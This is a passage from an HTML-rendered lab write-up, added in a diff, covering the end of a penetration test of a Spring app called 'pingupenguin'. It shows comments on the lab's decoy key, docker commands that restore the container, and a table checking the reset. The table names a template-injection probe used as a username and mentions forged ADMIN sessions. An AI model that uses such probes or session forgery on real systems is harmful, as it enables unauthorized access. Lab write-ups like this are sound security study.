+flag and a report with <strong>zero</strong> findings in it.</p>
+<p>The lab is also, unusually, <strong>honest about its own bait</strong>. It planted a decoy key
+next to the real one and <em>told you it was a decoy</em> — which is a rare generosity, and
+it is worth naming as a design choice: it removes the cheapest way to succeed (blind
+grep, first match) and forces the one measurement that generalises. The better
+version of this lab would delete the comments, keep the decoy, and add a third
+key-shaped string with no annotation at all.</p>
+<hr />
+<h2 id="10-restoration">10. Restoration</h2>
+<p>The lab was returned to its shipped state by <strong>destroying and recreating the
+container from the image</strong>, which is stronger than undoing my changes one at a time:</p>
+<pre><code>$ docker rm -f pingupenguin_container &amp;&amp; docker run -d --name pingupenguin_container pingupenguin:latest
+$ docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' pingupenguin_container
+[net-0-11]
+$ docker ps --format '{{.Names}}\t{{.Status}}\t{{.Ports}}'
+pingupenguin_container	Up 8 seconds	8080/tcp
+</code></pre>
+<p>Verified in the fresh container:</p>
+<table>
+<thead>
+<tr>
+<th>State I changed</th>
+<th>Verification in the recreated container</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>org.springframework.web</code> log level set to <code>DEBUG</code> (§3.4)</td>
+<td><code>configuredLevel= None effective= INFO</code> — shipped default</td>
+</tr>
+<tr>
+<td>Registered account <code>probe1</code> and <code>__${7*7}__</code> (§C-3)</td>
+<td><code>POST /login username=probe1</code> → <code>200</code> with <code>incorrectos</code>; a valid login is a <code>302</code> with <code>[response-cookie-header]</code>, so both accounts are gone (<code>ddl-auto=create-drop</code> on <code>jdbc:h2:mem:</code>)</td>
+</tr>
+<tr>
+<td>Two forged <code>ADMIN</code> sessions (§6)</td>
+<td><code>GET /admin</code> anonymous → <code>403</code></td>
+</tr>
+</tbody>
+</table>
+<p>Nothing was written to the host filesystem outside <code>/tmp/[tool]/pp</code> (the extracted
+jar, the heap dump, the two Python helpers). <code>auto_deploy.sh</code> was never executed.
+The <code>pingupenguin:latest</code> image was loaded and left in place, as shipped.</p>
+
+</main>
+<footer><p><strong>The markdown in the repository is the authority.</strong> This site is a rendering of it. Where the two disagree, the repository is correct and this page is wrong &mdash; report it as a build defect, not as a finding.</p><p>Target-internal paths, container addresses and cookie identifiers are redacted in this rendering. The repository markdown is unredacted.</p><p>Counts on this site are read out of the source files at build time, and the renderer is <code>markdown-it-py</code>. Nothing on this page was written by hand except this footer, the homepage and the stylesheet.</p></footer>
+</body>
+</html>
